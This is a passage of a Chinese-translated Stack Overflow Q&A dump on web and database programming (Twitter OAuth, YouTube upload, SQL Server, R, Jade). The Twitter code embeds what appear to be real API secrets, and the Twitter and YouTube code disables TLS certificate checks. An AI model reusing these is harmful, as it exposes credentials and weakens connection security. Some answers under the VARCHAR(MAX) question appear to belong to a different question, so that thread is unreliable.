  "message": "Bad Request"
 }
} 
```

我正在使用 Google 驱动器库：google-api-services-drive-v2-rev1-1.7.2-beta.jar

凭据很好，因为我可以从用户的谷歌驱动器列出或下载文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T19:11:09.660

我认为问题出在您的库版本中。当前版本是 v2-rev39-1.12.0-beta。检查[http://code.google.com/p/google-api-java-client/wiki/APIs#Drive_API](http://code.google.com/p/google-api-java-client/wiki/APIs#Drive_API)。使用最新的 API 库版本总是更好。当我们错过一次更新时，我们在 BigQuery API 上遇到了很多问题。

# jquery-plugins - 在单个项目中使用 Bootstrap 和 Fancybox

> ID：14348749
> 
> 赞同：4
> 
> 时间：2013-01-15T23:18:43.680
> 
> 标签：jquery-plugins, twitter-bootstrap, fancybox, javascript-namespaces

我在单个项目中使用 Bootstrap 和 Fancybox，包括它：

```
<script src="http://code.jquery.com/jquery-latest.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="fancybox/jquery.fancybox-1.3.4.pack.js"></script> 
```

这些文件存在并被 Chrome 包含。

创建 Fancybox 元素时：

```
$(document).ready(function() {
    [...]

    jQuery("a.fancy").fancybox({
        'transitionIn'  : 'none',
        'transitionOut' : 'none'    
    });
}); 
```

JS 抛出错误：

```
Uncaught TypeError: Cannot read property 'msie' of undefined jquery.fancybox-1.3.4.pack.js:18
Uncaught TypeError: Object [object Object] has no method 'fancybox' 
```

（引导功能正在工作）

这是命名空间问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:29:12.580

DOM 是在调用 fancybox 之前加载的吗？如果不试试这个：

```
$(document).ready(function() {
    $('a.fancy').fancybox({
        'transitionIn'  : 'none',
        'transitionOut' : 'none'
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T17:52:42.307

我刚刚通过捆绑更新得到了这个。

看起来最新版本的 jQuery 不再支持 ($.browser)。jQuery 文档推荐使用[Modernizr](http://modernizr.com/)

我用过[这个](http://jquery.thewikies.com/browser/)，效果很好。

[jQuery 1.9 文档](http://jquery.com/upgrade-guide/1.9/#jquery-browser-removed)

# c# - 在 MVC3 中填充下拉列表不起作用

> ID：14348750
> 
> 赞同：0
> 
> 时间：2013-01-15T23:18:43.900
> 
> 标签：c#, asp.net-mvc-3, drop-down-menu

我正在学习 MVC3，但找不到一种可以填充下拉列表的方法。尝试过 StackOverFlow 的示例，但不起作用。从我在网上找到的一个项目中尝试过，但它不起作用。[在 Youtube 上找到了这个人的教程，](http://www.youtube.com/watch?v=HVrPwfJIprY)它给了我以下错误：

> 没有具有键“Categ”的“IEnumerable”类型的 ViewData 项。

现在我别无选择。

这是我在`list`（我认为）中获得值的地方：

```
public class Cat
{
    DataBaseContext db;

    public IEnumerable<MyCategory> Categories()
    {
        db = new DataBaseContext();
        List<MyCategory> categories = (from b in db.BookCategory
                                       select new MyCategory { name = b.Name, id = b.ID }).ToList();

        if (categories != null)
        {
            var ocategories = from ct in categories
                              orderby ct.id
                              select ct;
            return ocategories;
        }
        else return null;

    }
}

public class MyCategory
{
    public string name { get; set; }
    public int id { get;set;}
} 
```

这是`Controller`：

```
// GET: /Entity/Create

    public ActionResult Create()
    {
        return View();
    }

 [HttpPost]
    public ActionResult Create(BookEntity ent)
    {
        Cat ca= new Cat();

        IEnumerable<SelectListItem> items = ca.Categories().Select(c => new SelectListItem
        {
            Text = c.name,
            Value = c.id.ToString()
        });
        ViewBag.Categ = items;

        db.BookEntity.Add(ent);
        db.SaveChanges();
        return RedirectToAction("Index");
    } 
```

这是`View`：

```
<div class="editor-field">
        @Html.DropDownList("Categ"," Select One ")

    </div> 
```

不知何故，它对我不起作用。我感谢任何帮助和建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:42:41.237

修改您的操作方法以使用 ViewData 而不是 ViewBag 并且 View 标记将起作用。

```
public ActionResult Create()
    {
        Cat ca= new Cat();

        IEnumerable<SelectListItem> items = ca.Categories().Select(c => new SelectListItem
        {
            Text = c.name,
            Value = c.id.ToString()
        });
        ViewData["Categ"] = items;

        return View("Index");
    }

[HttpPost]
public ActionResult Create(BookEntity ent)
    {   
        db.BookEntity.Add(ent);
        db.SaveChanges();
        return RedirectToAction("Index");
    } 
```

您需要在 GET 操作而不是 POST 操作中填充 ViewData。通过命名下拉列表类别以及 MVC 约定将自动查看 ViewData 容器。

# php - Yii Mysql 选择自定义字段

> ID：14348759
> 
> 赞同：0
> 
> 时间：2013-01-15T23:19:35.290
> 
> 标签：php, mysql, yii

我会在一个字段中有 2 个自定义字段。我怎样才能做到这一点？

* * *

代码：

```
$criteria = new CDbCriteria;
$criteria->select='(number*2) AS custom_field, (number*4) AS custom_field';
$criteria->order='custom_field';
$model = Events::model()->findAll($criteria); 
```

桌子：

```
number   custom_field
------------------
2         4, 8
3         6, 12

custom_field ordered -> 4, 6, 8, 12 
```

* * *

编辑：

```
<?php $this->widget('bootstrap.widgets.TbGridView',array(
    'type'=>'striped bordered condensed',
    'id'=>'recurringevents-grid',
    'dataProvider'=>$model,
    'columns'=>array(
        'custom_field',
    ),
)); ?> 
```

输出：

```
Custom Field
4
6
8
12 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T05:12:42.617

第一个。事件.php

```
class Events extends CActiveRecord {
    public $custom_square, $custome_square_square;
// skip ...
    public funciton rules() {
    // skip ...
          array('custom_square, custom_square_square', 'safe'), 
```

第二。单独的sql选择：

```
$criteria->select = array(
    new CDbExpression('(number*2) AS custom_square'), 
    new CDbExpression('(number*4) AS custom_square_square'),
);
$criteria->order='custom_square';
$model = Events::model()->findAll($criteria); 
```

# grid - 如何为网格中的每个标题添加一个复选框？

> ID：14348761
> 
> 赞同：1
> 
> 时间：2013-01-15T23:19:50.493
> 
> 标签：grid, extjs4

我正在运行 EXTJs4.11 并使用网格。我需要能够为每个 Grid 列标题添加一个“复选框”。我试图做的是让最终用户能够在网格标题中选择一个复选框，该复选框将“选择”该列。通过收集所有“SELECTED”列，然后我希望能够通过使用 extjs4 网格的 RECONFIGURE 方法来隐藏所有其他“NON-SELECTED”列。我知道重新配置将允许用户使用不同的列集重新绘制网格，如果我使用未定义的存储参数，则使用相同的存储。我将使用***reconfigure(undefined, iColumns)***其中 iColumns 是“SELECTED”列的数组。我只是不确定如何为每个网格标题添加一个“复选框”。

# java - 我需要一种方法来确保给数组的单词是真实的单词。（RTP-hsa，控制台）

> ID：14348763
> 
> 赞同：0
> 
> 时间：2013-01-15T23:19:58.177
> 
> 标签：java, dictionary, console, spell-checking, spelling

我解决了确保只使用数组中的字母的问题，现在我需要一种将字典导入或加载到控制台的方法，这样就不能使用假词。我有找到一个 txt 文档并在程序启动时将其加载到数组中的想法，但我没有找到任何运气。如果有人找到方法，请提供有关如何将其加载到 hsa.console 表单的详细说明。谢谢。（Java 准备编程 hsa.console）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:51:49.143

这是一些解决单词是否存在的问题。我不确定你是如何存储字符数组的，所以我猜它是一个二维字符数组。wordExists 方法是用于检查单词是否存在的方法。我使用了一个测试来检查它是否有效，并且它在多个输入上都有效。编辑：我刚刚意识到，如果它是回文，这可能会导致单词循环回到自身，我一制作就发布固定代码

```
public static boolean wordExists(char[] [] characters, String word)
{
    char[] word_as_char = word.toCharArray();
    for (int i = 0; i < characters.length; i++)
    {
        for (int j = 0; j < characters[0].length; j++)
        {
            boolean wordExists = checkWord(characters, word_as_char, 0, i, j);
            if (wordExists)
            {
                return true;
            }
        }
    }
    return false;
}

public static boolean checkWord(char[] [] characters, char[] word, int index, int x, int y)
{
    boolean wordExists = false;
    if (index < word.length) {
        if (characters[x] [y] == word[index])
        {
            if (x + 1 < characters.length)
            {
                wordExists = wordExists | checkWord(characters, word, index + 1, x + 1, y);
            }
            if (x - 1 > 0)
            {
                wordExists = wordExists | checkWord(characters, word, index + 1, x - 1, y);
            }
            if (y + 1 < characters[0].length)
            {
                wordExists = wordExists | checkWord(characters, word, index + 1, x, y + 1);
            }
            if (y - 1 > 0)
            {
                wordExists = wordExists | checkWord(characters, word, index + 1, x, y - 1);
            }
        }
    }
    if (index == word.length - 1 && characters[x] [y] == word[index])
    {
        wordExists = true;
    }
    return wordExists;
} 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:52:53.093

`CheckLetter != (" ")`不检查内容相等性，它检查引用相等性 - 这两个变量是否引用同一个对象。使用`!" ".equals(CheckLetter)`. 更好的是，不要`String`用于保存单个字符，有`char`这个，并且有`Character`一些处理它们的方法的类（如`toUpperCase`）。

# sql-server - SQL Server 和 Excel 认为两个明显相同的字符串不相等

> ID：14348770
> 
> 赞同：3
> 
> 时间：2013-01-15T23:21:12.643
> 
> 标签：sql-server, string, tsql, sql-server-2005, duplicates

这可能太简单了，但我似乎无法弄清楚这一点。

我有一个简单的 SELECT DISTINCT 语句，它返回两行：代码和说明

它们是这样的：

```
00065        Stmt to Party 2-4 pgs
00065        Stmt to Party 2-4 pgs 
```

但是，SELECT 语句中的 DISTINCT 永远不会过滤掉重复项。我尝试在 Excel 2010 中粘贴这两个值并尝试使用“删除重复”功能，没有用；我还尝试了一个像这样的简单公式：=IF(D337=D338,"X","Y") 结果总是“Y”。

Excel 中的自动筛选也表明这些字符串是不同的。

使用 SQL Server LEN(DESCRIPTION) 函数测试，字符串的长度相等。其中也没有看不见的特殊字符。

如何找出*这*两个字符串之间的不同之处？请注意，我仅将 Excel 用于测试/故障排除目的。

请帮忙。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:37:14.863

使用离线十六进制编辑器或在线工具（例如[http://www.string-functions.com/string-hex.aspx](http://www.string-functions.com/string-hex.aspx) ）并比较两个字符串中的字节。然后你应该看看它们是否相同。（来自上面的评论）

然后，您可以进行手动查询，通过删除或更新字符串来更新数据库以使值一致。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-03-03T22:32:38.530

尝试转换为 nvarchar，然后采用不同的值。在某些情况下有效...

# api - Twitter API 1.1 GET/favorites/list.json 工作一段时间然后停止工作？

> ID：14348772
> 
> 赞同：0
> 
> 时间：2013-01-15T23:21:26.387
> 
> 标签：api, twitter

请在下面查看我的代码。基本上它可以工作，我会检索我需要的东西，但只需要很短的时间，然后它就会停止工作。我希望使用返回的数据来创建 Twitter 提要。这不能是这样吗？

```
$oauth_consumer_key = '-------------------';
$oauth_consumer_key_secret = '-------------------';
$oauth_token = '-------------------';
$oauth_token_secret = '-------------------';
$oauth_nonce = '-------------------';
$oauth_signature = '-------------------';
$oauth_timestamp = time();

$oauth_hash = '';
$oauth_hash .= 'oauth_consumer_key=9bSWNyMCJ2Pu5VOibPU13A&amp;';
$oauth_hash .= 'oauth_nonce='.$oauth_nonce.'&amp;';
$oauth_hash .= 'oauth_signature_method=HMAC-SHA1&amp;';
$oauth_hash .= 'oauth_timestamp='.$oauth_timestamp.'&amp;';
$oauth_hash .= 'oauth_token=559439614-4cmIUCxb9FfUBsNTmeHZrox2FRpVQbvuED508lQm&amp;';
$oauth_hash .= 'oauth_version=1.0';

$base = '';
$base .= 'GET';
$base .= '&amp;';
$base .= rawurlencode('https://api.twitter.com/1.1/favorites/list.json');
$base .= '&amp;';
$base .= rawurlencode($oauth_hash);

$key = '';
$key .= rawurlencode('tF3CtuDtPGh8OYPBw7ZRs8Mrrj8kjmZRS0Q5jeA1vw'); // Consumer Secret
$key .= '&amp;';
$key .= rawurlencode('FDji1JuBeCNcQzjADjQdN3sOmk7xlAV3ILuooWCuYI'); // Access Token Secret

$signature = base64_encode(hash_hmac('sha1', $base, $key, true));
$signature = rawurlencode($signature);

// Construct cURL Headers...

$oauth_header = '';
$oauth_header .= 'oauth_consumer_key="'.$oauth_consumer_key.'", '; 
$oauth_header .= 'oauth_nonce="'.$oauth_nonce.'", '; 
$oauth_header .= 'oauth_signature="'.$oauth_signature.'", '; 
$oauth_header .= 'oauth_signature_method="HMAC-SHA1", ';
$oauth_header .= 'oauth_timestamp="'.$oauth_timestamp.'", '; 
$oauth_header .= 'oauth_token="'.$oauth_token.'", ';
$oauth_header .= 'oauth_version="1.0", ';

$curl_header = array("Authorization: Oauth {$oauth_header}", 'Expect:');

// Make the cURL Request...

$curl_request = curl_init();
curl_setopt($curl_request, CURLOPT_HTTPHEADER, $curl_header);
curl_setopt($curl_request, CURLOPT_HEADER, false);
curl_setopt($curl_request, CURLOPT_URL, 'https://api.twitter.com/1.1/favorites/list.json');
curl_setopt($curl_request, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl_request, CURLOPT_SSL_VERIFYPEER, false);
$json = curl_exec($curl_request);
curl_close($curl_request);

$json =  json_decode($json, true); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-29T19:28:09.947

是的 - 这是由于 Twitter 对 GET 收藏/列表的速率限制，它允许每个访问令牌每 15 分钟窗口有 15 个请求：[https ://dev.twitter.com/docs/rate-limiting/1.1/limits](https://dev.twitter.com/docs/rate-limiting/1.1/limits)

为了克服这个问题，您可能希望在 PHP 中使用缓存解决方案将输出写入本地文件，并使用 cron 作业来请求 PHP。此链接应该可以帮助您：[http ://www.webdevdoor.com/php/jquery-twitter-feed-part2-caching-tweets/](http://www.webdevdoor.com/php/jquery-twitter-feed-part2-caching-tweets/)

# express - Jade：如何包含 javascript 文件

> ID：14348776
> 
> 赞同：58
> 
> 时间：2013-01-15T23:22:18.197
> 
> 标签：express, pug

我需要在网页中包含一个 javascript 文件。我写了以下内容：

```
include /../scripts/jquery.timeago.js 
```

但我明白了

```
<script>/*
 * timeago: a jQuery plugin, version: 0.8.2 (2010-02-16)
 * @requires jQuery v1.2.3 or later
 *
 * Timeago is a jQuery plugin that makes it easy to support automatically
 * updating fuzzy timestamps (e.g. "4 minutes ago" or "about 1 day ago").
 *
 * For usage and examples, visit:
 * http://timeago.yarp.com/
 *
 * Licensed under the MIT:
 * http://www.opensource.org/licenses/mit-license.php
 *
 * Copyright (c) 2008-2010, Ryan McGeary (ryanonjavascript -[at]- mcgeary [*dot*] org)
 */
(function($) {
....
</script> 
```

结果。但是我需要：

```
<script src="/Scripts/jquery.timeago.js" type="text/javascript"></script> 
```

怎么做？

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2013-01-16T09:16:04.240

把它放在你的玉文件中：

`script(src="/Scripts/jquery.timeago.js")`

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-03-17T16:30:55.237

你可以把这段代码放在你的jade文件中：

```
 script(type='text/javascript' src='public/vendor/jquery/jquery.min.js') 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-01-27T00:12:24.717

此外，如果您想在您的翡翠文件中包含内联 js，您也可以执行以下操作：

```
script(type="text/javascript").
console.log('hello world'); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-03-06T14:34:40.010

将脚本添加到您的翡翠文件的语法是

```
script(src="",...,otherAttribute="") 
```

像下面这样的示例，它将 Jquery Bootstraps 添加到页面。

```
 script( src="https://code.jquery.com/jquery-3.2.1.slim.min.js",  integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" ,crossorigin="anonymous")

script(src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js", integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q", crossorigin="anonymous")

  script( src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" ,integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl", crossorigin="anonymous") 
```

# regex - 如何对包含给定单词的句子向量进行子集化

> ID：14348777
> 
> 赞同：2
> 
> 时间：2013-01-15T23:22:23.080
> 
> 标签：regex, string, r, subset

假设我有一个句子向量：

```
Vector
Juan is searching for a magazine.
Julia searched her car.
Go to the market to buy eggs.
Your name is unsearchable.
Search for me when you get to Paris.
Can you search for a low cost solution? 
```

我想要这个向量的一个子集，它只包含带有“搜索”一词或其变体（即已搜索、不可搜索、搜索）的条目。在 excel 中，我可能会使用类似`ISNUMBER(SEARCH("search",A1))`的方法来找出列`A1`中包含单词“ `search`”的单元格。

在我看来，这`grep`可能是我正在寻找的功能，但我不知道如何正确使用它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:27:19.327

如果`vector`是您指定的转换器：

```
> grep("search", vector, ignore.case=TRUE)
[1] 1 2 4 5 6
> vector[grep("search", vector, ignore.case=TRUE)]
[1] "Juan is searching for a magazine."      
[2] "Julia searched her car."                
[3] "Your name is unsearchable."             
[4] "Search for me when you get to Paris."   
[5] "Can you search for a low cost solution?" 
```

# c# - 如何使用 ExecuteNonQuery 在 VARCHAR(MAX) 列中插入超过 8000 个字符？

> ID：14348778
> 
> 赞同：2
> 
> 时间：2013-01-15T23:22:31.310
> 
> 标签：c#, sql-server-2008, enterprise-library, executenonquery, varcharmax

`ExecuteNonQuery`我正在尝试通过（以及`DatabaseFactory.CreateDatabase()`来自 MS Practices Enterprise Library）插入 > 8000 个字符（从网页提交）。存储过程将参数定义为`VARCHAR(MAX)`. 列是`VARCHAR(MAX)`。理论上，2GB的数据应该是可以通过的。

我该怎么做才能传递数据> 8000？我设置了一个断点，`string.Length`确实> 8K。

```
 public static void UpdateTerms(string terms)
   {
        Database db = DatabaseFactory.CreateDatabase();
        db.ExecuteNonQuery("uspUpdateTerms", terms);
    } 
```

存储过程：

```
ALTER PROCEDURE [dbo].[uspUpdateTerms]
    @Terms VARCHAR(MAX)
AS
  SET NOCOUNT ON

  INSERT INTO tblTerms(Terms)
  VALUES(@Terms) 
```

表（只是为了表明一切都是`varchar(max)`）：

```
CREATE TABLE [dbo].[tblTerms](
[ID] [int] IDENTITY(1,1) NOT NULL,
[Terms] [varchar](max) NULL,
[DateUpdated] [datetime] NULL, 
```

.

***更新：***

我刚刚更改了代码，这似乎有效，但我不确定有什么区别：

```
 public static void UpdateTerms(string terms)
 {
        Database db = DatabaseFactory.CreateDatabase();
        DbCommand cmd = db.GetStoredProcCommand("uspUpdateTerms");
        db.AddInParameter(cmd, "Terms", DbType.String, terms);
        db.ExecuteNonQuery(cmd);
 } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:41:53.277

`REPLICATE`返回输入类型，而不考虑以后的分配。这很烦人，但为了避免静默截断，请尝试：

```
SET @x = REPLICATE(CONVERT(VARCHAR(MAX), 'a'), 10000); 
```

这是因为 SQL Server 在`REPLICATE`考虑您将其分配给什么或您尝试将其扩展为多少字符之前执行该操作。它只关心输入表达式来确定它应该返回什么，如果输入不是最大类型，它假定它应该适合 8,000 字节。这在[联机丛书](http://msdn.microsoft.com/en-us/library/ms174383.aspx)中进行了解释：

> 如果 string_expression 不是 varchar(max) 或 nvarchar(max) 类型，则 REPLICATE 将返回值截断为 8,000 字节。要返回大于 8,000 字节的值，必须将 string_expression 显式转换为适当的大值数据类型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T22:41:59.103

您的示例代码可以通过执行以下操作来修复：

```
declare @x varchar(max)
set @x = replicate (cast('a' as varchar(max)), 10000)
select @x, len(@x) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T23:32:48.813

问题可能不是数据的存储，可能是检索。

如果您试图通过企业管理器确定数据库中是否存储了超过 8000 个字符，那么如果您只是选择列的内容并查看文本长度，那么您就不走运了：企业管理器限制列输出.

要确定该列中实际存储了多少数据，请执行以下查询：

```
SELECT DATALENGTH(Terms) FROM tblTerms 
```

这将告诉您存储了多少文本。

编辑：

另一个想法刚刚出现：企业库缓存存储过程参数以提高性能。如果您在将参数设置为 测试后更改了存储过程`nvarchar(8000)`，然后在不重置应用程序的情况下将参数切换为`nvarchar(max)`（如果 IIS 托管，则为`iisreset`脏`web.config`），那么您仍将使用旧的存储过程参数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T22:45:36.303

您还没有显示您尝试使用的代码`ExecutenonQuery`。请注意，您应该使用参数。

```
using(var con = new SqlConnection(conString))
using(var cmd = new SqlCommand("storedProcedureName", con))
{
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.Parameters.Add("@text", SqlDbType.NVarChar, -1);
    cmd.Parameters["@text"].Value = yourVeryLongText;
    cmd.ExecuteNonQuery();
} 
```

# c# - WPF 中的 Cybele TN 桥主机集成

> ID：14348779
> 
> 赞同：1
> 
> 时间：2013-01-15T23:22:41.633
> 
> 标签：c#, winforms, wpf-controls, activex

有人在 WPF(.Net) 中使用 Cybele Software TN Bridge Host Integration Pack 吗？

该软件包由三个 dll 组成。

*   Cybele.TNBridge.dll
*   Cybele.TNBridge.Vcl.dll
*   Mono.Security.dll

而他们导出的显示组件是 Cybele.TNBridge.Display : System.Windows.Forms.Control, ISupportInitialize, IEditable

谁工作过这个组件，请告诉我从哪里开始。任何网站，教程网站，任何东西都欢迎开始。产品手册不太友好，无法直接在 wpf 环境中查看和工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T15:00:18.237

我理解你的沮丧。我在我的雇主的应用程序中使用 TN Bridge for .NET，发现 Cybele 的文档太薄了，以至于我不得不经常给他们的客户支持发送电子邮件。我确信回复我的电子邮件并不是最有效地利用他们的时间，但如果他们的文档更完整，我就不会发送电子邮件了。

或许更令人沮丧的是，我之前没有写过 Tn3270 通信的代码，也不知道在连接、发出命令等之后必须在代码中显式地放入 WaitFor 调用。我习惯了 WebServices 或 WCF 调用代码除非您显式异步调用这些服务，否则在建立连接或从调用返回值到达之前不会继续执行。我现在意识到在 TN3270 的世界中，一切都是异步的。三周前知道这一点会很高兴！

也许 TN3270 编程更令人沮丧的方面是您在三个半月前提出这个问题但没有得到一个答案。3270 并不是一个不寻常的协议，但要么很少有人在.NET 中对其进行编程，要么出于某种原因不愿谈论它。

回答您的问题：是的，.NET 世界中有几个人使用 Cybele 的 TN Bridge for .NET。

# php - PHP Zend Youtube API 上传 - 此操作错误需要开发人员密钥

> ID：14348780
> 
> 赞同：1
> 
> 时间：2013-01-15T23:22:46.807
> 
> 标签：php, api, zend-framework, upload, youtube

我正在尝试基于浏览器上传到 YouTube。我正在为 ZF2 使用 PHP、Zend Framework 2 和 ZendGData 客户端库。我已经按照 Google Developers 指南进行了设置，并成功地执行了未经授权的请求 - 即搜索视频。我还能够执行授权请求 - 即从我的 YouTube 帐户中检索我的全名。

当我尝试上传时 - 检索上传令牌时出现错误：

**预期响应代码 200，得到 403**

**此操作需要开发人员密钥**

**错误 403**

我的上传器控制器如下所示。如教程中所述，我已使用[https://code.google.com/apis/youtube/dashboard](https://code.google.com/apis/youtube/dashboard)设置了开发人员密钥，并将其包含在我的代码中。还提供了相应的用户/电子邮件和密码。我正在使用 Curl 连接到开发指南中未涵盖的 API，但我认为这不是问题所在。

`

```
namespace Uploader\Controller;

use Zend\Mvc\Controller\AbstractActionController;
use Zend\View\Model\ViewModel;
use ZendGData\YouTube;
use ZendGData\ClientLogin;
use Zend\Http\Client\Adapter;

class UploaderController extends AbstractActionController
{
    public function indexAction()
    {   
        $adapter = new Adapter\Curl();
        $curl = new \ZendGData\HttpClient();
        $curl->setAdapter($adapter);

        $adapter->setOptions(array(
            'curloptions' => array(
                CURLOPT_SSL_VERIFYPEER => FALSE,
                CURLOPT_SSL_VERIFYHOST => FALSE,
            )
        ));

        $authenticationURL= 'https://www.google.com/accounts/ClientLogin';
        $httpClient = ClientLogin::getHttpClient(
                          $username = '***********@gmail.com',
                          $password = '*********',
                          $service = 'youtube',
                          $client = $curl,
                          $source = 'Testing', // a short string identifying your application
                          $loginToken = null,
                          $loginCaptcha = null,
                          $authenticationURL
                          );

        $developerKey = 'AI39si55e**********************************************************************nY9p5NJ8y-8PwS9d8Jw';
        $applicationId = 'Testing';
        $clientId = "Youtube Tester V1";

        $yt = new YouTube($httpClient, $applicationId, $clientId, $developerKey);
        $yt->setMajorProtocolVersion(2);

        $myVideoEntry = new YouTube\VideoEntry;

        $myVideoEntry->setVideoTitle('My Test Movie');
        $myVideoEntry->setVideoDescription('My Test Movie');
        // The category must be a valid YouTube category!
        $myVideoEntry->setVideoCategory('Autos');

        // Set keywords. Please note that this must be a comma-separated string
        // and that individual keywords cannot contain whitespace
        $myVideoEntry->SetVideoTags('cars, funny');

        $tokenHandlerUrl = 'http://gdata.youtube.com/action/GetUploadToken';
        $tokenArray = $yt->getFormUploadToken($myVideoEntry, $tokenHandlerUrl);

        $data = array('tokenValue' => $tokenArray['token'], 'postUrl' => $tokenArray['url']);

        return new ViewModel( $data );
    }

} 
```

`

据我所知，我几乎完全遵循了开发人员指南并拥有开发人员密钥，但仍然出现错误。任何想法可能是什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T18:48:32.600

```
$tokenArray = $yt->getFormUploadToken($myVideoEntry, $clientId, $developerKey);

// vendor/zendframework/zendgdata/library/ZendGData/YouTube.php
public function getFormUploadToken(
        $videoEntry, $clientId, $developerKey,
        $url='https://gdata.youtube.com/action/GetUploadToken')
    {
        //$extraHeaders = $this->getHttpClient()->getRequest()->getHeaders()->toArray();
        $extraHeaders = array(
            'X-GData-Client' => $clientId,
            'X-GData-Key' => 'key='. $developerKey
        );

        if ($url != null && is_string($url)) {
            // $response is a Zend\Http\Response object
            $response = $this->post($videoEntry, $url, null, null, $extraHeaders);
            return self::parseFormUploadTokenResponse($response->getBody());
        } else {
            throw new App\Exception(
                'Url must be provided as a string URL');
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-12T16:24:08.537

因此，在自己为此苦苦挣扎了一段时间之后，我终于找到了一个很好的解决方法。似乎您在实例化 YouTube 对象时提供的 dev 密钥没有被插入到标头中。要解决此问题，只需在执行操作时提供标头即可。这适用于任何条目，例如播放列表或视频。

```
$dev_key = '****';
$entry = new ZendGData\YouTube\VideoEntry();
// do entry stuff here
$uploadUrl = 'http://uploads.gdata.youtube.com/feeds/api/users/default/uploads'
$className = 'ZendGData\YouTube\VideoEntry';
$extraHeaders = array('X-GData-Key' => "key=$dev_key");
try {
    $yt->insertEntry($entry, $uploadUrl, $className, $extraHeaders);
} catch (Exception $e) {
    die($e->getMessage());
} 
```

# r - 具有第二美学的 ggplot2 内部函数：范围问题

> ID：14348781
> 
> 赞同：2
> 
> 时间：2013-01-15T23:22:47.103
> 
> 标签：r, ggplot2

我有以下测试数据：

```
structure(list(r = c(5.44702625911984, 6.3431860464319, 2.89023592667928, 
6.66260769449341, 7.5521021076857, 5.50645078944005, 6.70001850525037, 
7.39615449137166, 5.96032231142622, 7.88929821115731, 9.45119299499902, 
6.13534105776075, 7.79397401855071, 5.24488870603935, 4.53178061905952, 
5.80573244536445, 10.1194252475799, 12.5794215385996, 7.47503723957468, 
7.8682648760597, 15.7540766770233, 14.9800818974568, 14.5672865569748, 
9.5347507057429, 18.6791666362954, 10.4588651710497, 15.2076130678251, 
10.5052588219606, 13.1314628288852, 12.8384811800557, 10.9978569438483, 
10.0197995395016, 10.1479274794689, 12.5864754383382, 10.7985399338233, 
11.1100572430765, 10.756576992292, 9.17309427876051, 10.0441987112265, 
10.0652520950654), f1 = structure(c(2L, 2L, 2L, 2L, 2L, 2L, 2L, 
2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 1L, 1L, 1L, 
1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 
1L), .Label = c("H", "L"), class = "factor"), f2 = structure(c(1L, 
1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 2L, 2L, 2L, 2L, 2L, 2L, 2L, 
2L, 2L, 2L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 1L, 2L, 2L, 2L, 
2L, 2L, 2L, 2L, 2L, 2L, 2L), class = "factor", .Label = c("Joe", 
"Sally"))), .Names = c("r", "f1", "f2"), row.names = c(NA, -40L
), class = "data.frame") 
```

以下函数应该绘制点（它确实）并连接每组的手段（它没有）：

```
testFunc <- function(formula = NULL, data = NULL) {
    res <- as.character(formula[[2]])
    fac1 <- as.character(formula[[3]][2])
    fac2 <- as.character(formula[[3]][3])

    # Specify the data & aesthetics     
    p <- ggplot(data, aes_string(x = fac1, y = res, color = fac2,
        group = fac2))

    # Now add points
    p <- p + geom_point() # works fine if we stop here

    # Due to a bug in ggplot2_0.9.3, we must calc some quantities
    # and put them in a separate data frame for a new aesthetic
    avg <- aggregate(data[,res] ~ data[,fac1]*data[, fac2], data, FUN = mean)
    names(avg) <- c("factor1", "factor2", "mean")   
    p <- p + geom_line(aes_string(x = 'factor1', y = 'mean', group = 'factor2'), data = avg)
    } 
```

当我运行它时：

```
ex <- testFunc(formula = r ~ f1*f2, data = td)
print(ex) 
```

我收到此错误：

```
Error in eval(expr, envir, enclos) : object 'f2' not found 
```

我似乎总是遇到这些范围界定问题，有什么建议吗？我以为我正在为该错误遵循适当的解决方法。使用`aes`而不是`aes_string`，或不引用变量名`geom_line`并不能解决它。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:28:59.177

当我遇到继承美学的问题时，我总是返回并从主`ggplot()`调用中删除任何不需要的东西。试试这个：

```
testFunc <- function(formula = NULL, data = NULL) {
    res <- as.character(formula[[2]])
    fac1 <- as.character(formula[[3]][2])
    fac2 <- as.character(formula[[3]][3])

    # Now add points
